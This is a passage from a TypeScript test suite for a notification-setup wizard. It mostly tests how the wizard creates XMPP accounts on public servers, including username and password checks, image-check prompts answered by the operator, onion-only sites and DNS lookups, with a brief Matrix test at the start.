				['#label Set up Matrix', 'https://matrix.org', '#0', 'morphitio', 'pw', '', '#last'],
				{ admin: relay(true) }
			);
			expect(check.printed).not.toMatch(/accept the invitation/);
		});

		it('“Send a test note” from the menu says the same, naming the bot the relay uses', async () => {
			const r = await wizard(['#label Send a test note', '#0', '@operator:matrix.org', '#last'], {
				status: { offered: ['matrix'], matrix: '@notices:vigilante.trading' },
				admin: (args) => (args[0] === 'send' ? { ok: true, joined: false } : { ok: true })
			});
			expect(r.printed).toMatch(/accept the invitation from @notices:vigilante\.trading/);
			expect(r.printed).toMatch(/did not join in time/);
		});
	});

	describe('XMPP: making the site’s account on a public server', () => {
		type Reg = { ok: boolean; [k: string]: unknown };
		/** A relay whose XMPP servers answer as told: register-form per domain,
		 *  register (a list of answers, one per try), archive-off, send. */
		function xmppRelay(o: {
			forms?: Record<string, Reg>;
			register?: Array<Reg | ((onAsk?: AskHandler) => Promise<Reg>)>;
			archive?: Reg;
			send?: Reg;
		}) {
			const regs = [...(o.register ?? [{ ok: true }])];
			const registered: Array<Record<string, string>> = [];
			const formsAsked: string[] = [];
			const admin = async (
				args: readonly string[],
				input: Record<string, string>,
				onAsk?: AskHandler
			): Promise<AdminAnswer> => {
				const domain = (input.MORPHIT_NOTIFY_XMPP_JID ?? '').split('@')[1] ?? '';
				if (args[0] === 'register-form') {
					formsAsked.push(domain);
					return (o.forms?.[domain] ?? { ok: true, status: 'open' }) as AdminAnswer;
				}
				if (args[0] === 'register') {
					registered.push({ ...input });
					const next = regs.length > 1 ? regs.shift()! : regs[0]!;
					return (typeof next === 'function' ? await next(onAsk) : next) as AdminAnswer;
				}
				if (args[0] === 'archive-off')
					return (o.archive ?? { ok: true, archive: 'off' }) as AdminAnswer;
				if (args[0] === 'send') return (o.send ?? { ok: true }) as AdminAnswer;
				return { ok: true };
			};
			return { admin, registered, formsAsked };
		}
		const FORMS = {
			'og.im': { ok: true, status: 'open' },
			'openim.nl': { ok: true, status: 'captcha', url: 'https://openim.nl/captcha/1' },
			'jabber.de': { ok: true, status: 'closed' }
		};
		const NEW = ['#label Set up XMPP (Jabber)', '#0'];

		it('asks the suggested servers live, offers those that take accounts, and makes it on og.im', async () => {
			const x = xmppRelay({ forms: FORMS });
			const srv: string[] = [];
			const r = await wizard([...NEW, '#0', 'MorphitIO', '', 'me@example.org', '#last'], {
				admin: x.admin,
				deps: {
					resolveSrv: async (name) => {
						srv.push(name);
						if (name === '_xmpp-client._tcp.og.im')
							return [{ name: 'xmpp.og.im', port: 5222, priority: 0, weight: 0 }];
						throw new Error('ENOTFOUND');
					}
				}
			});
			expect([...x.formsAsked].sort()).toEqual(['jabber.de', 'og.im', 'openim.nl']);
			expect(r.printed).toMatch(/og\.im\s+takes new accounts\n/);
			expect(r.printed).toMatch(/openim\.nl\s+takes new accounts after a picture check/);
			expect(r.printed).toMatch(/jabber\.de\s+takes no new accounts this way/);
			const menu = r.menus.find((m) => m.includes('Another server…'))!;
			expect(menu).toEqual(['og.im (recommended)', 'openim.nl', 'Another server…', 'Cancel']);
			expect(srv).toContain('_xmpp-client._tcp.og.im');
			// The name lower-cased; a strong password made (never printed).
			const reg = x.registered[0]!;
			expect(reg.MORPHIT_NOTIFY_XMPP_JID).toBe('morphitio@og.im');
			expect(reg.MORPHIT_NOTIFY_XMPP_HOST).toBe('xmpp.og.im');
			const pw = reg.MORPHIT_NOTIFY_XMPP_PASSWORD!;
			expect(pw).toHaveLength(24);
			expect(checkXmppPassword(pw, 'morphitio')).toBeNull();
			expect(r.printed).not.toContain(pw);
			expect(r.printed).toMatch(/Account morphitio@og\.im made/);
			expect(r.printed).toMatch(/message archive off/);
			// Archive off and the test note come before the save, with the same settings.
			expect(r.steps.filter((s) => s.startsWith('admin ') && !s.endsWith('status'))).toEqual([
				'admin register-form xmpp',
				'admin register-form xmpp',
				'admin register-form xmpp',
				'admin register xmpp',
				'admin archive-off xmpp',
				'admin send xmpp'
			]);
			expect(r.saved[0]).toMatchObject({
				MORPHIT_NOTIFY_XMPP_JID: 'morphitio@og.im',
				MORPHIT_NOTIFY_XMPP_PASSWORD: pw,
				MORPHIT_NOTIFY_XMPP_HOST: 'xmpp.og.im',
				MORPHIT_NOTIFY_XMPP_PORT: '5222',
				MORPHIT_NOTIFY_XMPP_SECURITY: 'starttls'
			});
		});

		it('checks the username before anything is sent', async () => {
			const x = xmppRelay({ forms: FORMS });
			const r = await wizard(
				[
					...NEW,
					'#0',
					'morphitio@og.im',
					'a',
					'bad name!',
					'x..y',
					'morphitio',
					'',
					'me@example.org',
					'#last'
				],
				{ admin: x.admin }
			);
			expect(r.printed).toMatch(/Just the name, without @/);
			expect(r.printed).toMatch(/Use 2 to 32 characters/);
			expect(r.printed).toMatch(/Use only letters a–z, digits/);
			expect(r.printed).toMatch(/No two of \. _ - in a row/);
			expect(x.registered).toHaveLength(1);
			expect(x.registered[0]!.MORPHIT_NOTIFY_XMPP_JID).toBe('morphitio@og.im');
		});

		it('checks a typed password: length, the username in it, the mix, typed twice', async () => {
			const x = xmppRelay({ forms: FORMS });
			const good = 'Tr4in-Lamp-Stone';
			const r = await wizard(
				[
					...NEW,
					'#0',
					'morphitio',
					'short1A!',
					'xMorphitIO-2026!',
					'alllowercaseletters',
					good,
					'Tr4in-Lamp-Stonx',
					good,
					good,
					'me@example.org',
					'#last'
				],
				{ admin: x.admin }
			);
			expect(r.printed).toMatch(/Use at least 12 characters \(it has 8\)/);
			expect(r.printed).toMatch(/It cannot contain the username/);
			expect(r.printed).toMatch(/Mix at least three of/);
			expect(r.printed).toMatch(/The two did not match/);
			expect(x.registered).toHaveLength(1);
			expect(x.registered[0]!.MORPHIT_NOTIFY_XMPP_PASSWORD).toBe(good);
			expect(r.printed).not.toContain(good);
		});

		it('a taken name: asked for another; a refused password: the server’s words, then asked again', async () => {
			const x = xmppRelay({
				forms: FORMS,
				register: [
					{ ok: false, error: 'refused', why: 'taken', text: 'User already exists' },
					{ ok: false, error: 'refused', why: 'not_acceptable', text: 'The password is too weak' },
					{ ok: true }
				]
			});
			const r = await wizard(
				[
					...NEW,
					'#0',
					'morphitio',
					'',
					'morphitio2',
					'',
					'Better-Pass-2026x',
					'Better-Pass-2026x',
					'me@example.org',
					'#last'
				],
				{ admin: x.admin }
			);
			expect(r.printed).toMatch(/The name “morphitio” is taken on og\.im/);
			expect(r.printed).toMatch(
				/og\.im did not accept that name or password \(“The password is too weak”\)/
			);
			expect(x.registered.map((g) => g.MORPHIT_NOTIFY_XMPP_JID)).toEqual([
				'morphitio@og.im',
				'morphitio2@og.im',
				'morphitio2@og.im'
			]);
			expect(x.registered[2]!.MORPHIT_NOTIFY_XMPP_PASSWORD).toBe('Better-Pass-2026x');
			expect(r.saved).toHaveLength(1);
		});

		it('a picture check: its page is shown and the answer goes back; a wrong one is tried again', async () => {
			const answers: Array<Record<string, string>> = [];
			const x = xmppRelay({
				forms: FORMS,
				register: [
					async (onAsk) => {
						answers.push(
							await onAsk!({ ok: true, ask: 'captcha', url: 'https://openim.nl/captcha/1' })
						);
						return {
							ok: false,
							error: 'refused',
							why: 'captcha_wrong',
							text: 'The CAPTCHA verification has failed'
						};
					},
					async (onAsk) => {
						answers.push(
							await onAsk!({ ok: true, ask: 'captcha', url: 'https://openim.nl/captcha/2' })
						);
						return { ok: true };
					}
				]
			});
			const r = await wizard(
				[...NEW, '#label openim.nl', 'morphitio', '', 'WRONG', 'K7Q2X', 'me@example.org', '#last'],
				{ admin: x.admin }
			);
			expect(r.printed).toMatch(
				/openim\.nl wants a picture check[^\n]*\n\s+https:\/\/openim\.nl\/captcha\/1/
			);
			expect(r.printed).toMatch(/The picture answer was not right/);
			expect(answers).toEqual([{ answer: 'WRONG' }, { answer: 'K7Q2X' }]);
			expect(x.registered[0]!.MORPHIT_NOTIFY_XMPP_PASSWORD).toBe(
				x.registered[1]!.MORPHIT_NOTIFY_XMPP_PASSWORD
			);
			expect(r.saved).toHaveLength(1);
		});

		it('the server stopped waiting for the picture answer: a new picture, tried again', async () => {
			const x = xmppRelay({
				forms: FORMS,
				register: [
					async (onAsk) => {
						await onAsk!({ ok: true, ask: 'captcha', url: 'https://openim.nl/captcha/1' });
						return { ok: false, error: 'refused', why: 'captcha_expired', text: '' };
					},
					async (onAsk) => {
						await onAsk!({ ok: true, ask: 'captcha', url: 'https://openim.nl/captcha/2' });
						return { ok: true };
					}
				]
			});
			const r = await wizard(
				[...NEW, '#label openim.nl', 'morphitio', '', 'SLOW', 'K7Q2X', 'me@example.org', '#last'],
				{ admin: x.admin }
			);
			expect(x.registered).toHaveLength(2);
			expect(r.saved).toHaveLength(1);
		});

		it.each([
			['rate_limited', /too many new accounts from this server lately/],
			['not_allowed', /takes no new account now/]
		])('%s: stops, nothing saved', async (why, says) => {
			const x = xmppRelay({
				forms: FORMS,
				register: [{ ok: false, error: 'refused', why, text: 'no' }]
			});
			const r = await wizard([...NEW, '#0', 'morphitio', '', '#last'], { admin: x.admin });
			expect(r.printed).toMatch(says);
			expect(x.registered).toHaveLength(1);
			expect(r.saved).toHaveLength(0);
		});

		it('another server: its name is checked, and it is asked live; one that takes none is explained', async () => {
			const x = xmppRelay({
				forms: {
					...FORMS,
					'closed.example': { ok: true, status: 'web', url: 'https://closed.example/register' },
					'open.example': { ok: true, status: 'open' }
				}
			});
			const r = await wizard(
				[
					...NEW,
					'#label Another server…',
					'https://open.example',
					'closed.example',
					'open.example',
					'morphitio',
					'',
					'me@example.org',
					'#last'
				],
				{ admin: x.admin }
			);
			expect(r.printed).toMatch(/That is not a server name/);
			expect(r.printed).toMatch(/closed\.example makes new accounts only on its website/);
			expect(r.printed).toMatch(/Its page: https:\/\/closed\.example\/register/);
			expect(x.registered[0]!.MORPHIT_NOTIFY_XMPP_JID).toBe('morphitio@open.example');
		});

		it('a zero-clearnet site: no public server suggested, no DNS asked, an .onion server only', async () => {
			const onion = `${'b'.repeat(56)}.onion`;
			const x = xmppRelay({ forms: { [onion]: { ok: true, status: 'open' } } });
			let dns = 0;
			const r = await wizard([...NEW, 'og.im', onion, 'morphitio', '', `me@${onion}`, '#last'], {
				status: { hiddenOnly: true, link: 'http://x.onion' },
				admin: x.admin,
				deps: {
					resolveSrv: async () => {
						dns++;
						return [];
					}
				}
			});
			expect(x.formsAsked).toEqual([onion]);
			expect(dns).toBe(0);
			expect(r.printed).toMatch(/give the server’s \.onion address/);
			expect(x.registered[0]!.MORPHIT_NOTIFY_XMPP_HOST).toBe(onion);
		});

		it('archive: off, not a setting there, or failed — said plainly, and the setup goes on', async () => {
			for (const [archive, says] of [
				[{ ok: true, archive: 'unsupported' }, /has no message-archive setting to turn off/],
				[
					{ ok: false, error: 'failed', reason: 'XmppError: XMPP server refused at login' },
					/Could not turn its message archive off/
				]
			] as const) {
				const x = xmppRelay({ forms: FORMS, archive });
				const r = await wizard([...NEW, '#0', 'morphitio', '', 'me@example.org', '#last'], {
					admin: x.admin
				});
				expect(r.printed).toMatch(says);
				expect(r.saved).toHaveLength(1);
			}
		});

		it('the test address is checked', async () => {
			const x = xmppRelay({ forms: FORMS });
			const r = await wizard(
				[...NEW, '#0', 'morphitio', '', 'not an address', 'me@example', 'me@example.org', '#last'],
				{ admin: x.admin }
			);
			expect(r.printed.match(/That is not an XMPP address/g)).toHaveLength(2);
			expect(r.saved).toHaveLength(1);
		});
	});

	describe('XMPP: an account that already exists', () => {
		it('checks the address, finds its server in DNS, and lets the operator change it', async () => {
			const steps: string[] = [];
			const r = await wizard(
				[
					'#label Set up XMPP (Jabber)',
					'#1',
					'not-a-jid',
					'Bot@Jabber.Example',
					'pw',
					'n',
					'bad host!',
					'#last'
				],
				{
					deps: {
						resolveSrv: async (name) => {
							steps.push(name);
							return name === '_xmpps-client._tcp.jabber.example'
								? [{ name: 'tls.jabber.example.', port: 5223, priority: 0, weight: 0 }]
								: [];
						}
					}
				}
			);
			expect(r.printed).toMatch(/That is not an XMPP address/);
			expect(r.printed).toMatch(/Its server: tls\.jabber\.example, port 5223, TLS/);
			expect(r.printed).toMatch(/That is not a server name\. Nothing was changed/);
			expect(steps).toEqual([
				'_xmpp-client._tcp.jabber.example',
				'_xmpps-client._tcp.jabber.example'
			]);
			expect(r.saved).toHaveLength(0);
			const ok = await wizard([
				'#label Set up XMPP (Jabber)',
				'#1',
				'bot@jabber.example',
				'pw',
				'n',
				'xmpp.jabber.example',
				'#0',
				'99999',
				'#last'
			]);
			expect(ok.printed).toMatch(/A port is a number from 1 to 65535/);
			const saved = await wizard([
				'#label Set up XMPP (Jabber)',
				'#1',
				'bot@jabber.example',
				'pw',
				'y',
				'me@example.org',
				'#last'
			]);
			expect(saved.saved[0]).toMatchObject({
				MORPHIT_NOTIFY_XMPP_JID: 'bot@jabber.example',
				MORPHIT_NOTIFY_XMPP_HOST: 'jabber.example',
				MORPHIT_NOTIFY_XMPP_PORT: '5222',
				MORPHIT_NOTIFY_XMPP_SECURITY: 'starttls'
			});
		});
	});
});
